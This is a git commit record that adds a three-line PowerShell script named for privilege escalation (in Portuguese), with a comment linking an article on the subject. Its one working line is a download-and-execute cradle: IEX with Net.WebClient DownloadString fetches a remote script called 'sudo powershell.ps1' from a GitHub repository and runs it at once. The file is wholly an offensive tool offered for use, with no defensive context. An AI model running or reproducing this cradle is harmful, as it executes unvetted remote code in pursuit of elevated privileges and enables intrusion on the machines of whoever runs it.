e34d6923f2f2694925cdd1e3bad7f5e222234c6c
Thiago Sousa <thiagosousa81@gmail.com>
2024-01-15 10:09:26 -0300

    §

---
+++ elevacao de privilegio.ps1
@@ -0,0 +1,3 @@
+# Para mais informações, consulte esse artigo
+# https://silo.tips/download/escalaao-de-privilegio-com-powershell-introduao-o-mundo-do-powershell-maximoz-16
+IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/ThiagoSousa81/Kali-Linux/main/sudo%20powershell.ps1")
